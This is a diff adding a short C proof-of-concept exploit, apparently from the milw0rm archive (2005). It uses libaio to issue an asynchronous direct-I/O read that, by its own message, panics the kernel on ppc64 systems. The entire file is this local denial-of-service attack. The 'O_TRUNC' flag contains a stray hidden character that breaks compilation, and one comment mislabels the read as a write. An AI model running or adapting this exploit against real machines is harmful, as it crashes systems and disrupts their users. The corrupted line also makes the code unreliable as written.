@@ -1,0 +1,106 @@
+//
+// Proof of Concept by Daniel McNeil
+// compile using cc -o aiodio_read aiodio_read.c -laio
+//
+
+#define _XOPEN_SOURCE 600 
+#define _GNU_SOURCE 
+
+
+#include <unistd.h> 
+#include <stdlib.h> 
+#include <stdio.h> 
+#include <string.h> 
+#include <errno.h> 
+#include <sys/fcntl.h> 
+#include <sys/mman.h> 
+#include <sys/wait.h> 
+#include <sys/stat.h> 
+
+
+#include <libaio.h> 
+
+
+int pagesize; 
+char *iobuf; 
+io_context_t myctx; 
+int aio_maxio = 4; 
+
+
+/* 
+* do a AIO DIO write 
+*/ 
+int do_aio_direct_read(int fd, char *iobuf, int offset, int size) 
+{ 
+struct iocb myiocb; 
+struct iocb *iocbp = &myiocb; 
+int ret; 
+struct io_event e; 
+struct stat s; 
+
+
+io_prep_pread(&myiocb, fd, iobuf, size, offset); 
+if ((ret = io_submit(myctx, 1, &iocbp)) != 1) { 
+perror("io_submit"); 
+return ret; 
+} 
+
+
+ret = io_getevents(myctx, 1, 1, &e, 0); 
+
+
+if (ret) { 
+struct iocb *iocb = e.obj; 
+int iosize = iocb->u.c.nbytes; 
+char *buf = iocb->u.c.buf; 
+long long loffset = iocb->u.c.offset; 
+
+
+printf("AIO read of %d at offset %lld returned %d\n", 
+iosize, loffset, e.res); 
+} 
+
+
+return ret; 
+
+
+
+} 
+
+
+int main(int argc, char *argv[]) 
+{ 
+char *filename; 
+int fd; 
+int err; 
+
+filename = "test.aio.file"; 
+fd = open(filename, O_RDWR|O_DIRECT|O_CREAT|O_TRUN­C, 0666); 
+
+
+pagesize = getpagesize(); 
+err = posix_memalign((void**) &iobuf, pagesize, pagesize); 
+if (err) { 
+fprintf(stderr, "Error allocating %d aligned bytes.\n", 
+pagesize); 
+exit(1); 
+} 
+err = write(fd, iobuf, pagesize); 
+if (err != pagesize) { 
+fprintf(stderr, "Error ret = %d writing %d bytes.\n", 
+err, pagesize); 
+perror(""); 
+exit(1); 
+} 
+memset(&myctx, 0, sizeof(myctx)); 
+io_queue_init(aio_maxio, &myctx); 
+err = do_aio_direct_read(fd, iobuf, 0, pagesize); 
+close(fd); 
+
+
+printf("This will panic on ppc64\n"); 
+return err; 
+
+}
+
+// milw0rm.com [2005-04-04]
